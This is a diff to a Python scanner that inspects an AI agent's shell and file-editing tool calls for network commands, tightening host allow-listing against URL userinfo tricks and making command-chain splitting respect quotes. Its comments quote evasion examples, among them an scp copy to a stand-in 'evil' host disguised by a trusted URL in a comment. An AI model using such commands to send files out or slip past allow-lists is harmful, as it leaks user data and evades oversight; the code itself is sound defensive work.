@@ -11,7 +11,7 @@ import re
 import unicodedata
 from dataclasses import dataclass, field
 from pathlib import Path
-from urllib.parse import unquote_plus
+from urllib.parse import unquote_plus, urlsplit
 
 _FOLD = str.maketrans({"ł": "l", "Ł": "L", "ø": "o", "Ø": "O", "ß": "ss", "đ": "d", "Đ": "D", "æ": "ae", "œ": "oe"})
 _B64 = re.compile(r"[A-Za-z0-9+/_-]{12,}={0,2}")
@@ -38,6 +38,37 @@ NETWORK_CODE = re.compile(
 
 
 _CHAIN = re.compile(r"&&|\|\||;|\n")
+
+
+def _split_chain(text: str) -> list[str]:
+    """Split a shell line at `&&`, `||`, `;` and newlines outside quotes: `curl x -d 'a;git config ...'` keeps the
+    quoted body in the curl segment (final release review, 2026-10-31). An unclosed quote keeps the rest together."""
+    segs: list[str] = []
+    cur: list[str] = []
+    quote = ""
+    i = 0
+    while i < len(text):
+        c = text[i]
+        if c == "\\" and quote != "'" and i + 1 < len(text):
+            cur.append(text[i:i + 2])
+            i += 2
+            continue
+        if quote:
+            if c == quote:
+                quote = ""
+        elif c in "'\"":
+            quote = c
+        else:
+            m = _CHAIN.match(text, i)
+            if m:
+                segs.append("".join(cur))
+                cur = []
+                i = m.end()
+                continue
+        cur.append(c)
+        i += 1
+    segs.append("".join(cur))
+    return segs
 # (`echo X > f && python send.py` reads f at run time, so a write next to a network command is kept)
 _LOCAL_ONLY = re.compile(r"\s*(?:git\s+(?:config|commit|tag|log|show|status|add|init)\b|cd\s|export\s+GIT_)")
 _EXT = r"\.(?:py|js|mjs|cjs|ts|sh|bash|ps1|rb|pl|php)"
@@ -248,7 +279,16 @@ SHELL_TOOLS = ("Bash", "PowerShell", "exec_command", "shell")
 def host_allowed(text: str, allow_hosts: list[str]) -> bool:
     if _NON_HTTP.search(text):
         return False  # `scp f user@evil:/tmp # https://github.com`: the real target is not the URL
-    hosts = re.findall(r"https?://([^/\s:'\"]+)", text)
+    hosts = []
+    for url in re.findall(r"https?://[^\s'\"<>]+", text, re.IGNORECASE):
+        try:
+            parts = urlsplit(url)
+            host = parts.hostname
+        except ValueError:
+            return False
+        if not host or "@" in parts.netloc or "\\" in url:
+            return False  # `https://trusted.test:pw@sink.test/`: userinfo hides the real host (final review, 2026-10-31)
+        hosts.append(host.rstrip("."))
     return bool(hosts) and all(any(h == a or h.endswith("." + a) for a in allow_hosts) for h in hosts)
 
 
@@ -301,7 +341,7 @@ def scan_tool_call(tool_name: str, tool_input, ident: Identity, strict: bool = F
         if not NETWORK.search(joined) and not _runs_network_script(joined, cwd):
             return []
         # `git config user.email X && curl ...`: the local part of a chain does not send anything
-        texts = [seg for t in texts for seg in _CHAIN.split(t)
+        texts = [seg for t in texts for seg in _split_chain(t)
                  if not _LOCAL_ONLY.match(seg) or NETWORK.search(seg) or _runs_network_script(seg, cwd)]
     if tool_name in ("Write", "Edit", "MultiEdit", "apply_patch", "NotebookEdit") and not strict:
         # A local file is fine, unless it is code that talks to the network: in the reproduction (2026-10-26) the
